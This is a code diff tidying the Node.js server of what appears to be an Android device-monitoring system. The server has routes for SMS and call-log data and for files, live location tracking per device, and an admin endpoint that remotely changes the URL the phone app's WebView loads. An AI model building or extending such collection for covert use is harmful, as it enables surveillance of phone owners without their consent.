@@ -1,82 +1,116 @@
-const express = require('express');
+// Core Node.js modules
 const http = require('http');
+const path = require('path');
+
+// Third-party packages
+const express = require('express');
 const { Server } = require('socket.io');
 const mongoose = require('mongoose');
 const cors = require('cors');
-const path = require('path');
 require('dotenv').config();
 
+// Custom middleware
 const authMiddleware = require('./middleware/authMiddleware');
 
+// Initialize Express app
 const app = express();
+
+// === MIDDLEWARE SETUP ===
+// Enable Cross-Origin Resource Sharing
 app.use(cors());
+// Parse incoming JSON requests
 app.use(express.json());
 
-// DB Connect
-mongoose.connect(process.env.MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true })
-    .then(() => console.log('MongoDB Connected'))
-    .catch(err => console.log(err));
+// === DATABASE CONNECTION ===
+mongoose.connect(process.env.MONGO_URI, {
+    useNewUrlParser: true,
+    useUnifiedTopology: true,
+})
+.then(() => console.log('MongoDB Connected Successfully'))
+.catch(err => {
+    console.error('MongoDB Connection Error:', err.message);
+    process.exit(1); // Exit process with failure
+});
 
-// Static folder for file downloads
+// === API ROUTES ===
+// Statically serve the 'uploads' folder for file access
 app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
 
-// API Routes
+// Register API route handlers
 app.use('/api/auth', require('./routes/auth'));
-// Note: Make sure to create these route files in your 'routes' folder
-// app.use('/api/devices', require('./routes/devices'));
+app.use('/api/data', require('./routes/data')); // Handles SMS, Call Logs
 app.use('/api/files', require('./routes/fileManager'));
-// app.use('/api/data', require('./routes/data'));
-
+// Note: Create a 'routes/devices.js' for device registration and listing
+// app.use('/api/devices', require('./routes/devices'));
 
 // === CONFIGURATION ROUTES ===
+// In-memory variable for WebView URL
+let webviewUrl = process.env.WEBVIEW_URL || 'https://www.google.com';
 
-let webviewUrl = process.env.WEBVIEW_URL || 'https://www.google.com'; // Default URL
-
-// Endpoint to get the current WebView URL (for Android app)
+// Endpoint for Android app to get the current WebView URL
 app.get('/api/config/webview-url', (req, res) => {
     res.json({ url: webviewUrl });
 });
 
-// Endpoint to update the WebView URL (for Admin Panel, secured)
+// Secured endpoint for Admin Panel to update the WebView URL
 app.post('/api/config/webview-url', authMiddleware, (req, res) => {
     const { url } = req.body;
+    // Basic validation for the URL
     if (!url || typeof url !== 'string' || !url.startsWith('http')) {
-        return res.status(400).json({ msg: 'A valid URL is required' });
+        return res.status(400).json({ msg: 'A valid URL starting with http/https is required' });
     }
     webviewUrl = url;
     console.log(`WebView URL updated to: ${webviewUrl}`);
     res.json({ msg: 'WebView URL updated successfully!', url: webviewUrl });
 });
 
+// === PRODUCTION DEPLOYMENT SETUP ===
+// This block will run only when the app is in production mode
+if (process.env.NODE_ENV === 'production') {
+    // Set the static folder for the built React app
+    app.use(express.static('client/build'));
 
-// === SERVER AND SOCKET.IO SETUP ===
+    // For any route that is not an API route, serve the React app's index.html
+    app.get('*', (req, res) => {
+        res.sendFile(path.resolve(__dirname, 'client', 'build', 'index.html'));
+    });
+}
 
+// === HTTP SERVER & SOCKET.IO SETUP ===
 const server = http.createServer(app);
 const io = new Server(server, {
     cors: {
-        origin: "http://localhost:3000", // React app ka URL
+        origin: "http://localhost:3000", // Allow connection from React dev server
         methods: ["GET", "POST"]
     }
 });
 
+// Handle real-time connections
 io.on('connection', (socket) => {
-    console.log('User Connected:', socket.id);
+    console.log(`User Connected: ${socket.id}`);
 
+    // Event to join a device-specific room
     socket.on('joinRoom', (deviceId) => {
         socket.join(deviceId);
         console.log(`Socket ${socket.id} joined room for device: ${deviceId}`);
     });
 
+    // Event for receiving and broadcasting location updates
     socket.on('updateLocation', (data) => {
-        // TODO: Save location to DB
-        io.to(data.deviceId).emit('locationUpdated', data);
-        console.log('Location update received and broadcasted for', data.deviceId);
+        if (data && data.deviceId) {
+            // TODO: Save the location to the database for persistence
+            // Broadcast the location to all clients in the device's room
+            io.to(data.deviceId).emit('locationUpdated', data);
+            console.log(`Location update for ${data.deviceId} broadcasted.`);
+        }
     });
 
+    // Handle disconnection
     socket.on('disconnect', () => {
-        console.log('User disconnected:', socket.id);
+        console.log(`User Disconnected: ${socket.id}`);
     });
 });
 
+// === START THE SERVER ===
 const PORT = process.env.PORT || 5000;
-server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+server.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
